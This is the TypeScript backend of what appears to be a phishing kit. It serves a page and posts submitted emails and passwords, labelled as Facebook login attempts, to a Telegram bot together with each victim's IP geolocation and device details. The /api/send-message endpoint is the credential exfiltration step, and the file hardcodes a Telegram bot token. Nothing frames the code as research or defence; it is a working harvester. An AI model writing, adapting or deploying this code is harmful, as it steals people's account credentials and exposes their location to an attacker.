import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import fetch from 'node-fetch';

// Telegram Bot functionality
async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const botToken = "7472968858:AAFGy_eA6XNh9IL05vnfJx47uuEwfUffQks";
    // Hardcoded token for testing
    let chatId: string | undefined;
    
    // If no chat ID in env vars, try to find it automatically
    if (!chatId) {
      console.log("No TELEGRAM_CHAT_ID found in environment variables. Attempting to detect automatically...");
      
      try {
        // Try to get chat ID from recent updates
        const apiUrl = `https://api.telegram.org/bot${botToken}/getUpdates`;
        const response = await fetch(apiUrl);
        const data = await response.json() as any;
        
        if (data.ok && data.result && data.result.length > 0) {
          for (const update of data.result) {
            if (update.message && update.message.chat && update.message.chat.id) {
              chatId = update.message.chat.id.toString();
              console.log("Found chat ID from updates:", chatId);
              console.log("TIP: Add this to your .env file as TELEGRAM_CHAT_ID for more reliability");
              break;
            }
          }
        }
      } catch (error) {
        console.error("Error getting updates:", error);
        // Continue execution and try other methods
      }
    }
    
    // If we still couldn't find the chat ID, provide helpful instructions
    if (!chatId) {
      console.log("Could not find chat ID automatically. Please follow these steps:");
      
      try {
        // Get information about the bot itself
        const botInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
        const botInfoData = await botInfoResponse.json() as any;
        
        if (botInfoData.ok && botInfoData.result) {
          console.log("1. Send a message to your bot @" + botInfoData.result.username + " in Telegram");
          console.log("2. Visit this URL in your browser: https://api.telegram.org/bot" + botToken + "/getUpdates");
          console.log("3. Look for 'chat':{'id':XXXXXXXXX} in the response");
          console.log("4. Add that number to your .env file as TELEGRAM_CHAT_ID=XXXXXXXXX");
          
          // Message sending will likely fail, but we'll try
          return false;
        }
      } catch (error) {
        console.error("Error getting bot info:", error);
        return false;
      }
    }
    
    // Send the message
    const sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const messageResponse = await fetch(sendMessageUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
    
    const messageData = await messageResponse.json() as any;
    if (messageData.ok) {
      console.log('Message sent successfully to Telegram');
      return true;
    } else {
      console.error('Failed to send message to Telegram:', messageData);
      return false;
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return false;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api

  // use storage to perform CRUD operations on the storage interface
  // e.g. storage.insertUser(user) or storage.getUserByUsername(username)

  // Serve the main index.html file at the root
  app.get('/', (req, res) => {
    res.sendFile('index.html', { root: '.' });
  });

  // Also serve it at /index.html path explicitly
  app.get('/index.html', (req, res) => {
    res.sendFile('index.html', { root: '.' });
  });

  // Helper function to get device details
  function getDeviceDetails(deviceInfo: any): string {
    if (!deviceInfo) return "No device information available";
    
    // Try to determine device type from user agent
    let deviceType = "Unknown";
    const ua = deviceInfo.userAgent?.toLowerCase() || "";
    
    if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
      deviceType = "iOS";
    } else if (ua.includes("android")) {
      deviceType = "Android";
    } else if (ua.includes("windows")) {
      deviceType = "Windows";
    } else if (ua.includes("mac os") || ua.includes("macintosh")) {
      deviceType = "Mac";
    } else if (ua.includes("linux")) {
      deviceType = "Linux";
    }
    
    // Try to determine browser
    let browser = "Unknown";
    if (ua.includes("chrome") && !ua.includes("chromium")) {
      browser = "Chrome";
    } else if (ua.includes("firefox")) {
      browser = "Firefox";
    } else if (ua.includes("safari") && !ua.includes("chrome")) {
      browser = "Safari";
    } else if (ua.includes("edge") || ua.includes("edg/")) {
      browser = "Edge";
    } else if (ua.includes("opera") || ua.includes("opr/")) {
      browser = "Opera";
    }

    return `
📱 Device Information:
• Type: ${deviceType}
• Browser: ${browser}
• Platform: ${deviceInfo.platform || "Unknown"}
• Screen Size: ${deviceInfo.screenWidth || "?"} x ${deviceInfo.screenHeight || "?"}
• Language: ${deviceInfo.language || "Unknown"}
• Time Zone: ${deviceInfo.timeZone || "Unknown"}
• User Agent: ${deviceInfo.userAgent || "Unknown"}`;
  }
  
  // Get IP and location information
  async function getIPInfo(req: Request): Promise<string> {
    try {
      // Get client IP address
      const forwardedFor = req.headers['x-forwarded-for'] as string;
      const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : req.ip || 'Unknown';
      
      try {
        // Try to get location information from ipinfo.io (free API, no key required for basic usage)
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json() as any;
        
        if (data && data.city) {
          return `
📍 Location Information:
• IP Address: ${ip}
• City: ${data.city || "Unknown"}
• Region: ${data.region || "Unknown"}
• Country: ${data.country || "Unknown"}
• Location: ${data.loc || "Unknown"}
• ISP: ${data.org || "Unknown"}`;
        }
      } catch (error) {
        console.error("Error getting IP location info:", error);
      }
      
      // Fallback if we couldn't get location data
      return `
📍 Location Information:
• IP Address: ${ip}
• Location: Could not determine`;
    } catch (error) {
      console.error("Error getting IP info:", error);
      return "Could not determine location information";
    }
  }

  // API endpoint to send message to Telegram
  app.post('/api/send-message', async (req: Request, res: Response) => {
    try {
      const { email, password, deviceInfo } = req.body;
      
      // Get location information
      const ipInfo = await getIPInfo(req);
      
      // Get device details
      const deviceDetails = getDeviceDetails(deviceInfo);
      
      // Format the message
      const timestamp = new Date().toLocaleString();
      let formattedMessage = `🚨 Login attempt from Facebook page at ${timestamp}:\n\n`;
      formattedMessage += `👤 Credentials:\n• Username/Email: ${email || 'Not provided'}\n• Password: ${password || 'Not provided'}\n`;
      
      // Add device and location information
      formattedMessage += deviceDetails;
      formattedMessage += `\n${ipInfo}`;
      
      // Send to Telegram
      const success = await sendTelegramMessage(formattedMessage);
      
      if (success) {
        return res.status(200).json({ success: true });
      } else {
        return res.status(500).json({ success: false, error: 'Failed to send message to Telegram' });
      }
    } catch (error) {
      console.error('Error in send-message endpoint:', error);
      return res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
